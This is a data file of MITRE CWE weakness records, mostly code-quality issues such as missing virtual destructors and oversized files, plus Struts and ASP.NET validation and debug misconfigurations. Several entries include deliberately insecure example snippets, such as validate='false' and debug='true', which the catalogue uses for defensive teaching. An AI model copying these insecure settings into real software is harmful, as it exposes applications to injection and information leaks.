{"ID": "1079", "Name": "Parent Class without Virtual Destructor Method", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A parent class contains one or more child classes, but the parent class does not have a virtual destructor method.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably due to undefined or unexpected behaviors. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1076", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "108", "Name": "Struts: Unvalidated Action Form", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "Every Action Form must have a corresponding validation form.", "ExtendedDescription": "If a Struts Action Form Mapping specifies a form, it must have a validation form defined under the Struts Validator.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1173", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "20", "ViewID": "700", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Other"], "Note": "If an action form mapping does not have a validation form defined, it may be vulnerable to a number of attacks that rely on unchecked input. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation."}, {"Scope": ["Confidentiality", "Integrity", "Availability", "Other"], "Impact": ["Other"], "Note": "Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack."}], "PotentialMitigations": [{"Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nMap every Action Form to a corresponding validation form.\n\n\nAn action or a form may perform validation in other ways, but the Struts Validator provides an excellent way to verify that all input receives at least a basic level of validation. Without this approach, it is difficult, and often impossible, to establish with a high level of confidence that all input is validated.\n"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1080", "Name": "Source Code File with Excessive Number of Lines of Code", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A source code file has too many lines of\n\t\t\t\t\tcode.", "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"too many lines of code\" may vary for each product or developer, CISQ recommends a default threshold value of 1000.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1120", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1082", "Name": "Class Instance Self Destruction Control Element", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code contains a class instance that calls the method or function to delete or destroy itself.", "ExtendedDescription": "\n\nFor example, in C++, \"delete this\" will cause the object to delete itself.\n\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1076", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1083", "Name": "Data Access from Outside Expected Data Manager Component", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product is intended to manage data access through a particular data manager component such as a relational or non-SQL database, but it contains code that performs data access operations without using that component.", "ExtendedDescription": "\n\nWhen the product has a data access component, the design may be intended to handle all data access operations through that component. If a data access operation is performed outside of that component, then this may indicate a violation of the intended design.\n\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1061", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}, "Top25Examples": [{"Reference": "CVE-2022-2493", "Description": "Data Access from Outside Expected Data Manager Component in GitHub repository openemr/openemr prior to 7.0.0."}]}
{"ID": "1084", "Name": "Invokable Control Element with Excessive File or Data Access Operations", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A function or method contains too many\n\t\t\t\t\toperations that utilize a data manager or file resource.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"too many operations\" may vary for each product or developer, CISQ recommends a default maximum of 7 operations for the same data manager or file.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "405", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1085", "Name": "Invokable Control Element with Excessive Volume of Commented-out Code", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A function, method, procedure, etc. contains an excessive amount of code that has been\n\t\t\t\t\tcommented out within its body.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"excessive volume\" may vary for each product or developer, CISQ recommends a default threshold of 2% of commented code.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1078", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1086", "Name": "Class with Excessive Number of Child Classes", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A class contains an unnecessarily large number of\n\t\t\t\t\tchildren.", "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"large number of children\" may vary for each product or developer, CISQ recommends a default maximum of 10 child classes.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1093", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1087", "Name": "Class with Virtual Method without a Virtual Destructor", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A class contains a virtual method, but the method does not have an associated virtual destructor.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably, e.g. due to undefined behavior. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1076", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1088", "Name": "Synchronous Access of Remote Resource without Timeout", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code has a synchronous call to a remote resource, but there is no timeout for the call, or the timeout is set to infinite.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably, since an outage for the remote resource can cause the product to hang. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "821", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1089", "Name": "Large Data Table with Excessive Number of Indices", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses a large data table that contains an excessively large number of\n\t\t\t\t\tindices.", "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\n\nWhile the interpretation of \"large data table\" and \"excessively large number of indices\" may vary for each product or developer, CISQ recommends a default threshold of 1000000 rows for a \"large\" table and a default threshold of 3 indices.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "405", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "109", "Name": "Struts: Validator Turned Off", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "Automatic filtering via a Struts bean has been turned off, which disables the Struts Validator and custom validation logic. This exposes the application to other weaknesses related to insufficient input validation.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1173", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "20", "ViewID": "700", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Ensure that an action form mapping enables validation. Set the validate field to true."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "This mapping defines an action for a download form:"}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<action path=\"/download\"\n\ttype=\"com.website.d2.action.DownloadAction\"\n\tname=\"downloadForm\"\n\tscope=\"request\"\n\tinput=\".download\"\n\tvalidate=\"false\">\n\t</action>\n```"}, {"BodyText": "This mapping has disabled validation. Disabling validation exposes this action to numerous types of attacks."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Other", "Note": "The Action Form mapping in the demonstrative example disables the form's validate() method. The Struts bean: write tag automatically encodes special HTML characters, replacing a < with \"&lt;\" and a > with \"&gt;\". This action can be disabled by specifying filter=\"false\" as an attribute of the tag to disable specified JSP pages. However, being disabled makes these pages susceptible to cross-site scripting attacks. An attacker may be able to insert malicious scripts as user input to write to these JSP pages."}]}
{"ID": "1090", "Name": "Method Containing Access of a Member Element from Another Class", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A method for a class performs an operation that directly\n\t\t\t\t\taccesses a member element from another class.", "ExtendedDescription": "\n\nThis issue suggests poor encapsulation and makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1061", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1091", "Name": "Use of Object without Invoking Destructor Method", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains a method that accesses an object but does not later invoke\n\t\t\t\t\tthe element's associated finalize/destructor method.", "ExtendedDescription": "\n\nThis issue can make the product perform more slowly by retaining memory and/or other resources longer than necessary. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "772", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "1076", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1092", "Name": "Use of Same Invokable Control Element in Multiple Architectural Layers", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses the same control element across multiple\n\t\t\t\t\tarchitectural layers.", "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1093", "Name": "Excessively Complex Data Representation", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses an unnecessarily complex internal representation for its data structures or interrelationships between those structures.", "ExtendedDescription": "\n\nThis issue makes it more difficult to understand or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}, {"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}}
{"ID": "1094", "Name": "Excessive Index Range Scan for a Data Resource", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains an index range scan for a large data table,\n\t\t\t\t\tbut the scan can cover a large number of rows.", "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\n\nWhile the interpretation of \"large data table\" and \"excessive index range\" may vary for each product or developer, CISQ recommends a threshold of 1000000 table rows and a threshold of 10 for the index range.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "405", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1095", "Name": "Loop Condition Value Update within the Loop", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses a loop with a control flow condition based on\n\t\t\t\t\ta value that is updated within the body of the loop.", "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1120", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1096", "Name": "Singleton Class Instance Creation without Proper Locking or Synchronization", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product implements a Singleton design pattern but does not use appropriate locking or other synchronization mechanism to ensure that the singleton class is only instantiated once.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably, e.g. by making the instantiation process non-thread-safe and introducing deadlock (CWE-833) or livelock conditions. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "820", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "662", "ViewID": "1305", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "662", "ViewID": "1340", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1097", "Name": "Persistent Storable Data Element without Associated Comparison Control Element", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses a storable data element that does not have\n\t\t\t\t\tall of the associated functions or methods that are necessary to support\n\t\t\t\t\tcomparison.", "ExtendedDescription": "\n\nFor example, with Java, a class that is made persistent requires both hashCode() and equals() methods to be defined.\n\n\nThis issue can prevent the product from running reliably, due to incorrect or unexpected comparison results. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1076", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "595", "ViewID": "1305", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1098", "Name": "Data Element containing Pointer Item without Proper Copy Control Element", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code contains a data element with a pointer that does not have an associated copy or constructor method.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1076", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1099", "Name": "Inconsistent Naming Conventions for Identifiers", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product's code, documentation, or other artifacts do not\n\t\t\t\t\tconsistently use the same naming conventions for variables, callables, groups of\n\t\t\t\t\trelated callables, I/O capabilities, data types, file names, or similar types of\n\t\t\t\t\telements.", "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and/or maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1078", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "11", "Name": "ASP.NET Misconfiguration: Creating Debug Binary", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "Debugging messages help attackers learn about the system and plan a form of attack.", "ExtendedDescription": "ASP .NET applications can be configured to produce debug binaries. These binaries give detailed debugging messages and should not be used in production environments. Debug binaries are meant to be used in a development or testing environment and can pose a security risk if they are deployed to production.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "489", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "ASP.NET", "Prevalence": "Undetermined"}], "BackgroundDetails": ["The debug attribute of the <compilation> tag defines whether compiled binaries should include debugging information. The use of debug binaries causes an application to provide as much information about itself as possible to the user."], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Build and Compilation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "Attackers can leverage the additional information they gain from debugging output to mount attacks targeted on the framework, database, or other resources used by the application."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["System Configuration"], "Description": "Avoid releasing debug binaries into the production environment. Change the debug mode to false when the application is deployed into production."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The file web.config contains the debug mode setting. Setting debug to \"true\" will let the browser display debugging information."}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n\t<configuration>\n\t\t<system.web>\n\t\t\t<compilation\n\t\t\tdefaultLanguage=\"c#\"\n\t\t\tdebug=\"true\"\n\t\t\t/>\n\t\t\t...\n\t\t</system.web>\n\t</configuration>\n```"}, {"BodyText": "Change the debug mode to false when the application is deployed into production."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "110", "Name": "Struts: Validator Without Form Field", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "Validation fields that do not appear in forms they are associated with indicate that the validation logic is out of date.", "ExtendedDescription": "\n\nIt is easy for developers to forget to update validation logic when they make changes to an ActionForm class. One indication that validation logic is not being properly maintained is inconsistencies between the action form and the validation form.\n\n\nAlthough J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1164", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "20", "ViewID": "700", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Other"], "Note": "It is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation."}], "DetectionMethods": [{"Method": "Automated Static Analysis", "Description": "To find the issue in the implementation, manual checks or automated static analysis could be applied to the XML configuration files.", "Effectiveness": "Moderate"}, {"Method": "Manual Static Analysis", "Description": "To find the issue in the implementation, manual checks or automated static analysis could be applied to the XML configuration files.", "Effectiveness": "Moderate"}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "This example shows an inconsistency between an action form and a validation form. with a third field."}, {"BodyText": "This first block of code shows an action form that has two fields, startDate and endDate."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class DateRangeForm extends ValidatorForm {\n\t\t\tString startDate, endDate;\n\t\t\tpublic void setStartDate(String startDate) {\n\t\t\t\tthis.startDate = startDate;\n\t\t\t}\n\t\t\tpublic void setEndDate(String endDate) {\n\t\t\t\tthis.endDate = endDate;\n\t\t\t}\n\t}\n```"}, {"BodyText": "This second block of related code shows a validation form with a third field: scale. The presence of the third field suggests that DateRangeForm was modified without taking validation into account."}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<form name=\"DateRangeForm\">\n\t\t<field property=\"startDate\" depends=\"date\">\n\t\t\t<arg0 key=\"start.date\"/>\n\t\t</field>\n\t\t<field property=\"endDate\" depends=\"date\">\n\t\t\t<arg0 key=\"end.date\"/>\n\t\t</field>\n\t\t<field property=\"scale\" depends=\"integer\">\n\t\t\t<arg0 key=\"range.scale\"/>\n\t\t</field>\n\t</form>\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
